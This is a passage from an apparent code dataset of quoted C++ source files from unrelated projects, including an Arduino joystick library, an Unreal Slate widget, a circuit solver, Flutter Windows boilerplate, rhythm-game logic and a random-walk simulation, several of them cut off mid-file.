\"default\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n      ei_ptr->what_code = ECS36B_ERROR_NULL_JSON_PTR;\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n      throw (*lv_exception_ptr);\n    }\n\n  if ((arg_json_ptr->isNull() == true) ||\n      (arg_json_ptr->isObject() != true))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_ACTION;\n      ei_ptr->which_string = \"default\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if (arg_json_ptr->isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n      throw (*lv_exception_ptr);\n    }\n\n  try\n    {\n      this->Core::JSON2Object(arg_json_ptr);\n    }\n  catch(ecs36b_Exception e)\n    {\n      int i;\n      for (i = 0; i < (e.info_vector).size(); i++)\n\t{\n\t  Exception_Info * ei_ptr_copy = new Exception_Info {};\n\t  (*ei_ptr_copy) = (*((e.info_vector)[i]));\n\t  (lv_exception_ptr->info_vector).push_back(ei_ptr_copy);\n\t}\n      e.myDestructor();\n    }\n\n  if (((*arg_json_ptr)[\"name\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"name\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_ACTION;\n      ei_ptr->which_string = \"name\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"name\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception_ptr->info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->name = ((*arg_json_ptr)[\"name\"]).asString();\n    }\n\n  if ((lv_exception_ptr->info_vector).size() != 0)\n    {\n      throw (*lv_exception_ptr);\n    }\n\n  return;\n}\n",
    "/**\n * \\copyright  Copyright 2024 juskim. All rights reserved.\n *             The code for this project follow the Apache 2.0 license and details \n *             are provided in the LICENSE file located in the root folder of this \n *             project. Details of SOUP used in this project can also be found in \n *             the SOUP file located in the root folder.\n * \n * @file       joystick_lib.cpp\n * @author     juskim (GitHub: jus-kim, YouTube: @juskim)\n * @brief      Generic joystick library.\n *\n * @internal\n * This is an internal implementation command.\n * @endinternal\n */\n\n\n#include \"joystick_lib.h\"\n\n\n#define RAD_TO_DEG 57.2958\n\n\njoystick_lib::joystick_lib(void)\n{\n  pinMode(profile.joystick_pin_click, INPUT_PULLUP);\n}\n\nint joystick_lib::get_xy_adc(int &adc_x, int &adc_y)\n{\n  adc_x = analogRead(JOYSTICK_PIN_X);\n  adc_y = analogRead(JOYSTICK_PIN_Y);\n\n  return 0;\n}\n\nint joystick_lib::get_xy_percent(int &percent_x, int &percent_y)\n{\n  int adc_x, adc_y;\n\n  get_xy_adc(adc_x, adc_y);\n\n  percent_x = (int)(((float)adc_x / adc_max) * 200) - 99.0;\n  percent_y = (int)(((float)adc_y / adc_max) * 200) - 101.0;\n\n  if (percent_x <= -99) {\n    percent_x = -100;\n  } else if (percent_x >= 99) {\n    percent_x = 100;\n  }\n  if (percent_y <= -99) {\n    percent_y = -100;\n  } else if (percent_y >= 99) {\n    percent_y = 100;\n  }\n\n  return 0;\n}\n\n//\n//  A+W  W  W+D\n//     \\ | /\n//   A -   - D\n//     / | \\\n//  A+S  S  S+D\n//\nint joystick_lib::get_direction_keys(int percent_x, int percent_y, joystick_keys_s &joystick_keys)\n{\n  int radius_squared;\n\n  joystick_keys.key_state_up = false;     // Forward\n  joystick_keys.key_state_left = false;   // Left\n  joystick_keys.key_state_down = false;   // Backward\n  joystick_keys.key_state_right = false;  // Right\n  joystick_keys.key_state_walk = false;   // Walking\n\n  // Check if outside of rest zone\n  radius_squared = sq(percent_x) + sq(percent_y);\n  if (radius_squared >= rest_radius_max_squared)\n  {\n    // Check if in walking zone\n    if (radius_squared <= walking_radius_max_squared) {\n      joystick_keys.key_state_walk = true;\n    }\n  }\n  else\n  {\n    // User is not using the joystick; return\n    return 0;\n  }\n\n  // Get direction angle and determine key(s) pressed\n  float angle_rad = atan2(percent_y, percent_x);\n  float angle_deg = angle_rad * RAD_TO_DEG;  // NOTE: I really don't want to deal with rads... :)\n  if ((angle_deg <= KEY_DEG_RIGHT + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) && (angle_deg >= KEY_DEG_RIGHT - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_right = true;\n  }\n  if ((angle_deg <= KEY_DEG_UP + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) && (angle_deg >= KEY_DEG_UP - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_up = true;\n  }\n  if ((angle_deg <= -KEY_DEG_LEFT + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) || (angle_deg >= KEY_DEG_LEFT - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_left = true;\n  }\n  if ((angle_deg <= KEY_DEG_DOWN + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) && (angle_deg >= KEY_DEG_DOWN - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_down = true;\n  }\n\n  return 0;\n}\n\nint joystick_lib::get_click(bool &click)\n{\n  click = digitalRead(profile.joystick_pin_click);\n  click = !click;  // Need to do opposite since pulled-high at resting\n\n  return 0;\n}\n\nint joystick_lib::press_keys(bool click, joystick_keys_s joystick_keys)\n{\n#if JOYSTYICK_AUTO_WALK_ENABLED == 1\n  // Press special key if within walking zone\n  if (joystick_keys.key_state_walk == true) {\n    Keyboard.press(joystick_keys.key_map_walk);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_walk);\n  }\n#endif\n\n  // Press/release joystick direction keys\n  if (joystick_keys.key_state_up == true) {\n    Keyboard.press(joystick_keys.key_map_up);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_up);\n  }\n  if (joystick_keys.key_state_left == true) {\n    Keyboard.press(joystick_keys.key_map_left);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_left);\n  }\n  if (joystick_keys.key_state_down == true) {\n    Keyboard.press(joystick_keys.key_map_down);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_down);\n  }\n  if (joystick_keys.key_state_right == true) {\n    Keyboard.press(joystick_keys.key_map_right);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_right);\n  }\n\n  // Press/release joystick click key\n  if (click == true) {\n    Keyboard.press(joystick_keys.key_map_click);\n  } else {\n    Keyboard.release(joystick_keys.key_map_click);\n  }\n}\n\nint joystick_lib::run_tasks(void)\n{\n  int percent_x, percent_y;\n  bool click;\n  joystick_keys_s joystick_keys;\n\n  get_xy_percent(percent_x, percent_y);\n  get_direction_keys(percent_x, percent_y, joystick_keys);\n  get_click(click);\n  press_keys(click, joystick_keys);\n\n  /*Serial.print(joystick_keys.key_state_up);\n  Serial.print(joystick_keys.key_state_left);\n  Serial.print(joystick_keys.key_state_down);\n  Serial.print(joystick_keys.key_state_right);\n  Serial.println(click);*/\n}\n",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Slate/Widgets/FavroPaneDrawer.h\"\n\n#include \"F2UEStyle.h\"\n#include \"SlateOptMacros.h\"\n#include \"Framework/Text/PlainTextLayoutMarshaller.h\"\n#include \"Framework/Text/SlateTextLayoutFactory.h\"\n#include \"Slate/Tabs/FavroDashboard.h\"\n#include \"Widgets/Text/SlateTextBlockLayout.h\"\n\nconst FVector2D MaxPanelSize(144.f, 25.f);\n\n#define LOCTEXT_NAMESPACE \"FavroPaneDrawer\"\n\nBEGIN_SLATE_FUNCTION_BUILD_OPTIMIZATION\n\n/**\n * Vertical text block for use in the tab drawer button.\n * Text is aligned to the top of the widget if it fits without clipping;\n * otherwise it is ellipsized and fills the widget height.\n */\nvoid SFavroPaneDrawerTextBlock::Construct(const FArguments& InArgs)\n{\n\tText = InArgs._Text;\n\tTextStyle = *InArgs._TextStyle;\n\tRotation = InArgs._Rotation;\n\tTextLayoutCache = MakeUnique<FSlateTextBlockLayout>(\n\t\tthis, FTextBlockStyle::GetDefault(), TOptional<ETextShapingMethod>(), TOptional<ETextFlowDirection>(),\n\t\tFCreateSlateTextLayout(), FPlainTextLayoutMarshaller::Create(), nullptr);\n\tTextLayoutCache->SetTextOverflowPolicy(InArgs._OverflowPolicy.IsSet()\n\t\t                                       ? InArgs._OverflowPolicy\n\t\t                                       : TextStyle.OverflowPolicy);\n}\n\nint32 SFavroPaneDrawerTextBlock::OnPaint(const FPaintArgs& Args, const FGeometry& AllottedGeometry,\n                                         const FSlateRect& MyCullingRect,\n                                         FSlateWindowElementList& OutDrawElements, int32 LayerId,\n                                         const FWidgetStyle& InWidgetStyle,\n                                         bool bParentEnabled) const\n{\n\t// We're going to figure out the bounds of the corresponding horizontal text, and then rotate it into a vertical orientation.\n\tconst FVector2D LocalSize = AllottedGeometry.GetLocalSize();\n\tconst FVector2D DesiredHorizontalTextSize = TextLayoutCache->GetDesiredSize();\n\tconst FVector2D ActualHorizontalTextSize(FMath::Min(DesiredHorizontalTextSize.X, LocalSize.Y),\n\t                                         FMath::Min(DesiredHorizontalTextSize.Y, LocalSize.X));\n\n\t// Now determine the center of the vertical text by rotating the dimensions of the horizontal text.\n\t// The center should align it to the top of the widget.\n\tconst FVector2D VerticalTextSize(ActualHorizontalTextSize.Y, ActualHorizontalTextSize.X);\n\tconst FVector2D VerticalTextCenter = VerticalTextSize / 2.f;\n\n\t// Now determine where the horizontal text should be positioned so that it is centered on the vertical text:\n\t//      +-+\n\t//      |v|\n\t//      |e|\n\t// [ horizontal ]\n\t//      |r|\n\t//      |t|\n\t//      +-+\n\tconst FVector2D HorizontalTextPosition = VerticalTextCenter - ActualHorizontalTextSize / 2.f;\n\n\t// Define the text's geometry using the horizontal bounds, then rotate it 90/-90 degrees into place to become vertical.\n\tconst FSlateRenderTransform RotationTransform(\n\t\tFSlateRenderTransform(FQuat2D(FMath::DegreesToRadians(Rotation.Get() == ERotation::Clockwise ? 90 : -90))));\n\tconst FGeometry TextGeometry = AllottedGeometry.MakeChild(ActualHorizontalTextSize,\n\t                                                          FSlateLayoutTransform(HorizontalTextPosition),\n\t                                                          RotationTransform, FVector2D(0.5f, 0.5f));\n\n\treturn TextLayoutCache->OnPaint(Args, TextGeometry, MyCullingRect, OutDrawElements, LayerId, InWidgetStyle,\n\t                                ShouldBeEnabled(bParentEnabled));\n}\n\nFVector2D SFavroPaneDrawerTextBlock::ComputeDesiredSize(float LayoutScaleMultiplier) const\n{\n\t// The text's desired size reflects the horizontal/untransformed text.\n\t// Switch the dimensions for vertical text.\n\tconst FVector2D DesiredHorizontalTextSize = TextLayoutCache->ComputeDesiredSize(\n\t\tFSlateTextBlockLayout::FWidgetDesiredSizeArgs(\n\t\t\tText.Get(),\n\t\t\tFText(),\n\t\t\t0.f,\n\t\t\tfalse,\n\t\t\tETextWrappingPolicy::DefaultWrapping,\n\t\t\tETextTransformPolicy::None,\n\t\t\tFMargin(),\n\t\t\t1.f,\n\t\t\tETextJustify::Left),\n\t\tLayoutScaleMultiplier, TextStyle);\n\treturn FVector2D(DesiredHorizontalTextSize.Y, DesiredHorizontalTextSize.X);\n}\n\n\nvoid SFavroPaneDrawerButton::Construct(const FArguments& InArgs, TSharedRef<FFavroPaneDrawerArgs> ForPanel)\n{\n\tconst FVector2D Size = MaxPanelSize;\n\n\tDockTabStyle = &FAppStyle::Get().GetWidgetStyle<FDockTabStyle>(\"Docking.Tab\");\n\tOnDrawerButtonPressed = InArgs._OnDrawerButtonPressed;\n\n\tPanel = ForPanel;\n\n\tconst FString Text = Panel->GetPanelID() == EFavroPaneType::Backlog ? \"Left Pane\" : \"Right Pane\";\n\tconst FString IconName = Panel->GetPanelID() == EFavroPaneType::Backlog ? \"Favro.LeftPane\" : \"Favro.RightPane\";\n\tconst FSlateBrush* Icon = FF2UEStyle::GetBrush(*IconName);\n\n\tTSharedRef<SBox> Box = SNew(SBox)\n\t\t.WidthOverride(Size.Y) // Swap desired dimensions for a vertical tab\n\t\t.HeightOverride(Size.X)\n\t\t.Clipping(EWidgetClipping::ClipToBounds);\n\n\tconst FMargin ContentPadding = FMargin(0.f, DockTabStyle->TabPadding.Top, 0.",
    "#include <vector>\n#include <string>\n#include <format>\n#include <iostream>\n#include <sstream>\n#include <Eigen/Dense>\n#include \"console/myconsole.h\"\n#include \"circuit/circuit.h\"\n#include \"circuit/circuit_node.h\"\n#include \"calc/analyze_entry.h\"\n#include \"calc/analyze_context.h\"\n#include \"global/global.h\"\n#include \"devices/base_device.h\"\n#include \"devices/dynamic_device.h\"\n#include \"devices/nonlinear_device.h\"\n#include \"devices/source_device.h\"\n#include \"calc/analyze_ac.h\"\n#include \"chart/plot_manager.h\"\n#include \"chart/print_manager.h\"\n\nAnalyzeAC::AnalyzeAC(Circuit* circuit, std::vector<CircuitNode>& nodes, int nodeCount)\n    : circuit(circuit), nodes(nodes), nodeCount(nodeCount) {}\n\nvoid AnalyzeAC::BuildACMNA(AnalyzeContext* context)\n{\n    // console->log(std::format(\"[SpParser] Start Build AC MNA\"));\n    context->matc.resize(context->nodeCount, context->nodeCount);\n    context->rhsc.resize(context->nodeCount, Eigen::NoChange);\n    context->matc.fill(0);\n    context->rhsc.fill(0);\n\n    for (auto& device : circuit->devices) {\n        device->appendStampAC(context);\n    }\n\n    // console->log(\"[SpParser] MNA Matrix (including ground)\");\n    // oss<<matc<<std::endl;\n    // console->log(oss.str()); oss = std::ostringstream();\n\n    // console->log(\"[SpParser] RHS Vector\");\n    // oss<<rhsc<<std::endl;\n    // console->log(oss.str()); oss = std::ostringstream();\n}\n\nvoid AnalyzeAC::SolveAC()\n{\n    AnalyzeContext* context = new AnalyzeContext(nodes, nodeCount);\n    std::vector<AnalyzeEntry*> results;\n    AnalyzeEntry* entry = NULL;\n\n    double step = std::pow((double)10, 1/(double)circuit->command_AC.np);\n\n    for(double v = circuit->command_AC.fstart; std::abs(v-circuit->command_AC.fstop) > 1e-5; v *= step)\n    {\n        context->freq = v;\n        auto& res = SolveACOneTime(context);\n        entry = new AnalyzeEntry();\n        entry->resultc = res;\n        entry->freq = v;\n        results.push_back(entry);\n    }\n\n    // console->log(\"[SpParser] Result:\");\n    // for(auto& entry: results)\n    // {\n    //     for(int i = 0; i < nodeCount - 1; i++)\n    //     {\n    //         oss<<nodes[i+1].prefix<<'('<<nodes[i+1].nodeName<<')'<<'\\t'<<'='<<'\\t'<<entry->resultc(i);\n    //         console->log(oss.str()); oss = std::ostringstream();\n    //     }\n    // }\n    if (circuit->command_PRINTs.size() > 0)\n    {\n        PrintManager::Print(context->nodeCount - 1, context->nodes, results);\n    }\n    \n    if (circuit->command_PLOTs.size() > 0)\n    {\n        PlotManager::Plot(context->nodeCount - 1, context->nodes, results);\n    }\n    delete context;\n}\n\nEigen::VectorXcd& AnalyzeAC::SolveACOneTime(AnalyzeContext* context)\n{\n    context->nodes = nodes;\n    context->nodeCount = nodeCount;\n    BuildACMNA(context);\n    context->ground = context->nodes[0];\n    Eigen::MatrixXcd mat_ex = context->matc.block(1, 1, context->nodeCount - 1, context->nodeCount - 1);\n    Eigen::VectorXcd rhs_ex = context->rhsc.tail(context->nodeCount - 1);\n    context->nodes.erase(context->nodes.begin());\n\n    console->log(\"[SpParser] Start Solve AC\");\n    console->log(\"[SpParser] MNA Matrix (excluding ground)\");\n    oss<<mat_ex<<std::endl;\n    console->log(oss.str()); oss = std::ostringstream();\n    \n    console->log(\"[SpParser] RHS Vector\");\n    oss<<rhs_ex<<std::endl;\n    console->log(oss.str()); oss = std::ostringstream();\n\n    Eigen::VectorXcd* x = new Eigen::VectorXcd();\n    *x = mat_ex.fullPivLu().solve(rhs_ex);\n    context->resc = *x;\n    return *x;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/* Arf3 Update API */\n#include <arf3.h>\nusing namespace Arf3;\n\n\n//\n\t/* Here we store some tint values, which are changed rarely. */\n\tstatic constexpr auto H_EARLY_R = 0.275f, H_EARLY_G = 0.495f, H_EARLY_B = 0.5603125f;\n\tstatic constexpr auto H_LATE_R = 0.5603125f, H_LATE_G = 0.3403125f, H_LATE_B = 0.275f;\n\tstatic constexpr auto H_HIT_R = 0.73f, H_HIT_G = 0.6244921875f, H_HIT_B = 0.4591015625f;\n\n\tstatic constexpr auto A_EARLY_R = 0.3125f, A_EARLY_G = 0.5625f, A_EARLY_B = 0.63671875f;\n\tstatic constexpr auto A_LATE_R = 0.63671875f, A_LATE_G = 0.38671875f, A_LATE_B = 0.3125f;\n\tstatic constexpr auto A_HIT_R = 1.0f, A_HIT_G = 0.85546875f, A_HIT_B = 0.62890625f;\n\n\t/* Here we use some typedefs to simplify our codes. */\n\ttypedef dmGameObject::HInstance GO;\n\ttypedef dmVMath::Vector3 v3i, *v3;\t\t\t\t\ttypedef dmVMath::Point3 p3;\n\ttypedef dmVMath::Vector4 v4i, *v4;\t\t\t\t\ttypedef dmVMath::Quat Qt;\n\n\t/* Here are some Quat Utils. */\n\tstatic const Qt D73(0.0f, 0.0f, 0.594822786751341f, 0.803856860617217f);\n\tinline Qt GetZQuad(const double degree) { return GetSINCOS(degree*0.5), Qt(0.0f,0.0f, SIN,COS); }\n//\n\n\n/* Object sweeping behaviors are gathered here. */\n#ifndef AR_BUILD_VIEWER\ninline JudgeResult SweepObjects(const uint16_t init_group, const uint16_t beyond_group) {\n\tJudgeResult result = {};\n\tfor( uint16_t current_group = init_group; current_group < beyond_group; current_group++ ) {\n\n\t\t/* Wish -> EchoChild */\n\t\tfor(const auto  current_wish_id : Arf->index[current_group].widx) {\n\t\t\t\t  auto& current_wish = Arf->wish[current_wish_id];\n\t\t\t\t  auto& current_ecs = current_wish.echochilds_ms_order;\n\t\t\tconst auto  ec_count = current_ecs.size();\n\t\t\tif(!ec_count)\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcontinue;\n\t\t\tif(mstime-current_ecs[0]->ms < 0  ||  mstime-current_ecs[ec_count-1]->ms > 470)\t\tcontinue;\n\n\t\t\tauto& entry = Arf->wish[current_wish_id].ec_ms_entry;\n\t\t\twhile(entry > -1  &&  mstime-current_ecs[entry]->ms < 0)\t\t\t\t\t\t\tentry--;\n\n\t\t\tfor( int16_t ei = entry+1; ei < ec_count; ei++ ) {\n\t\t\t\tEchoChild& current_echo = *current_ecs[ei];\n\t\t\t\tconst int32_t dt = mstime - current_echo.ms;\n\t\t\t\tif( dt > 470 )\t\t{ entry = ei; continue; }\n\t\t\t\tif( dt < 0 )\t\t  break;\n\n\t\t\t\tif( dt > 100  &&  current_echo.status <= NONJUDGED_LIT )   //  NONJUDGED -> 0   N_L -> 1\n\t\t\t\t\tresult.late++, current_echo.status = LOST;\n\t\t\t\telse if( current_echo.status==JUDGED_LIT )\n\t\t\t\t\tresult.hit++, current_echo.status = JUDGED, current_echo.judged_ms = mstime;\n\t\t\t}\n\t\t}\n\n\t\t/* Echo */\n\t\tfor( const auto current_echo_id : Arf->index[current_group].eidx ) {\n\t\t\tauto& current_echo = Arf->echo[current_echo_id];\n\t\t\tconst int32_t dt = mstime - current_echo.ms;\n\t\t\tif(dt < 0  ||  dt > 982)\t\tbreak;   // when dt>982, all objs in this group meet dt>470\n\t\t\tif(dt > 470)\t\t\t\t\tcontinue;\n\n\t\t\tif( dt > 100  &&  current_echo.status <= NONJUDGED_LIT )   //  NONJUDGED -> 0   N_L -> 1\n\t\t\t\tresult.late++, current_echo.status = LOST;\n\t\t\telse if( current_echo.status==JUDGED_LIT )\n\t\t\t\tresult.hit++, current_echo.status = JUDGED, current_echo.judged_ms = mstime;\n\t\t}\n\n\t\t/* Hint */\n\t\tfor( const auto current_hint_id : Arf->index[current_group].hidx ) {\n\t\t\tauto& current_hint = Arf->hint[current_hint_id];\n\t\t\tconst int32_t dt = mstime - current_hint.ms;\n\t\t\tif( dt<100 )\n\t\t\t\tbreak;\n\t\t\tif( current_hint.status <= NONJUDGED_LIT )   //  NONJUDGED -> 0   N_L -> 1\n\t\t\t\tresult.late++, current_hint.status = LOST;\n\t\t}\n\t}\n\treturn result;\n}\n#endif\n\n\n/* Param Setting Funcs */\nusing cfloat = const float;\ninline void UseWgo(lua_State* L, uint16_t& wgo_used, cfloat x, cfloat y, cfloat z, float& w) {\n\tif( x>=-36.0f && x<=1836.0f ) {   // X trim\n\t\tif( y>=-36.0f && y<=1116.0f ) {   // Y trim\n\t\t\tconst uint32_t k = (uint32_t)(x * 1009.0f) + (uint32_t)(y * 1013.0f);\n\t\t\tif( last_wgo.count(k) ) {   // Overlap trim\n\t\t\t\tconst uint16_t lwidx_lua = last_wgo[k];\n\n\t\t\t\t// tint.w Setting\n\t\t\t\tlua_pushnumber(L, 1.0);\n\t\t\t\tlua_rawseti(L, WTINT, lwidx_lua);\n\n\t\t\t\t// Scale Setting\n\t\t\t\tlua_rawgeti(L, WGO, lwidx_lua);\n\t\t\t\tSetScale(dmScript::CheckGOInstance(L, -1), 0.637f);\n\t\t\t\tlua_pop(L, 1);\n\t\t\t}\n\t\t\telse {   // Pass\n\t\t\t\twgo_used++;   // This functions as the wgo_used result and lua index simultaneously\n\t\t\t\tlua_pushnumber(L, w);\n\t\t\t\tlua_rawseti(L, WTINT, wgo_used);\n\n\t\t\t\t// Pos & Scale Setting\n\t\t\t\tlua_rawgeti(L, WGO, wgo_used);\n\t\t\t\tconst GO WGO = dmScript::CheckGOInstance(L, -1);\n\t\t\t\tlua_pop(L, 1);\t\tSetPosition( WGO, p3(x, y, z) );\n\t\t\t\tw = 1.0f - w;\t\tSetScale( WGO, 0.637f + 0.437f * w*w );\n\t\t\t\tlast_wgo[k] = wgo_used;\t\t\t// As 0.637f + 0.437f - 0.437f * (1 - tintw * tintw)\n\t\t\t}\n\t\t}\n\t}\n}\n\ninline void UseHgo(lua_State* L, uint16_t& hgo_used, uint16_t& ago_used, cfloat dt, cfloat jdt,\n\t\t\t\t   const uint8_t status, const uint8_t elstatus, cfloat x, cfloat y) {\n\t// Actually this could be merged into the main update func, with no avoidable duplication.\n\t// This is just for some isologue considerations.\n\n\t/* Prepare Rennder Elements */\n\tlua_rawgeti(L, HGO, hgo_used+1);\t\tconst GO hgo\t= dmScript::CheckGOInstance(L, -1);\n\tlua_rawgeti(L, AGOL, ago_used+1);\t\tconst GO agol\t= dmScript::CheckGOInst",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <bits/stdc++.h>\n#include <array>\n#include <cmath>\n#include <algorithm>\n#include <random>\n#include <numeric>\n#include <valarray>\n#include <vector>\n#include <set>\n#include <tuple>\nusing namespace std;\n\n/*\nV1 of pivot algorithm in C++ \n\ninstead of matrix multiplication, stores walk as a directions vector and changes directions before regenerating walk \n\n*/\n\n\n//n number of vertices (n-1 edges)\n\nconst int d = 2;\n\ndouble eucl_dist(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]);\n}\n\nvector<vector<int>> GenerateWalk(vector<int> directions, vector<vector<int>> coordinates, int n)\n{\n\n    vector<int> row(d, 0);\n\n    coordinates[0] = row;\n    /*\n    Directions List \n    0 Up +y\n    1 Right +x\n    2 Down -y\n    3 Left -x\n    4 +z\n    5 -z \n    */\n    //set<vector<int>> SAW;\n    //SAW.insert(row);\n    for (int k=1; k<n; k++) \n    {\n        if(directions[k]==0)\n        {\n            row[1] = row[1] + 1;\n        }    \n        else if(directions[k]==1)\n        {\n            row[0] = row[0] + 1;\n        } \n        else if(directions[k]==2)\n        {\n            row[1] = row[1] - 1;\n        } \n        else if(directions[k]==3)\n        {\n            row[0] = row[0] - 1;\n        } \n        else if(directions[k]==4)\n        {\n            row[2] = row[2] + 1;\n        } \n        else if(directions[k]==5)\n        {\n            row[2] = row[2] - 1;\n        }\n        coordinates[k] = row;\n        //SAW.insert(row);\n    }\n/*\n    if (SAW.size() == n)\n    {\n        cout << \"YAY\\n\";\n    }\n*/\n    return coordinates;\n}\n\n\nint GenerateWalkEfficient(vector<int> directions, vector<vector<int>> coordinates,set<vector<int>> checker, int pivotpoint, int pivotradius, int n)\n{\n    //cout << \"Pivot\\n\";\n     /*\n    Directions List \n    0 Up +y\n    1 Right +x\n    2 Down -y\n    3 Left -x\n    4 +z\n    5 -z \n    */\n    //set<vector<int>> checker;\n    //cout << \"Pivot Point\" << pivotpoint << \" \" << \"Pivot Radius\" << pivotradius << \"\\n\";\n    vector<int> row(d, 0);\n    vector<int> back_row(d, 0);\n    \n    checker.insert(row);\n    if(directions[pivotpoint]==0)\n        {\n            row[1] = row[1] + 1;\n        }    \n    else if(directions[pivotpoint]==1)\n        {\n            row[0] = row[0] + 1;\n        } \n    else if(directions[pivotpoint]==2)\n        {\n            row[1] = row[1] - 1;\n        } \n    else if(directions[pivotpoint]==3)\n        {\n            row[0] = row[0] - 1;\n        } \n    else if(directions[pivotpoint]==4)\n        {\n            row[2] = row[2] + 1;\n        } \n    else if(directions[pivotpoint]==5)\n        {\n            row[2] = row[2] - 1;\n        }\n\n    checker.insert(row);\n    //cout << row[0] << \" \" << row[1] << \"\\n\";\n    //cout << back_row[0] << \" \" << back_row[1] << \"\\n\\n\";\n    \n    for (int k=1; k<pivotradius+1; k++) \n    {\n        if ((pivotpoint+k == (n)) || (pivotpoint-k == -1))\n        {   \n            //One side of the pivot radius has reached the end\n            //need to proceed by increasing if PP closer to 0 or decrease if PP close to n\n    \n            if (pivotpoint >= n/2)\n            {\n                for (int kk=k; kk<n-k+1;kk++)\n                {\n                    if(directions[pivotpoint-kk]==0)\n                    {\n                        back_row[1] = back_row[1] - 1;\n                    }    \n                    else if(directions[pivotpoint-kk]==1)\n                    {\n                        back_row[0] = back_row[0] - 1;\n                    } \n                    else if(directions[pivotpoint-kk]==2)\n                    {\n                        back_row[1] = back_row[1] + 1;\n                    } \n                    else if(directions[pivotpoint-kk]==3)\n                    {\n                        back_row[0] = back_row[0] + 1;\n                    } \n                    else if(directions[pivotpoint-kk]==4)\n                    {\n                        back_row[2] = back_row[2] - 1;\n                    } \n                  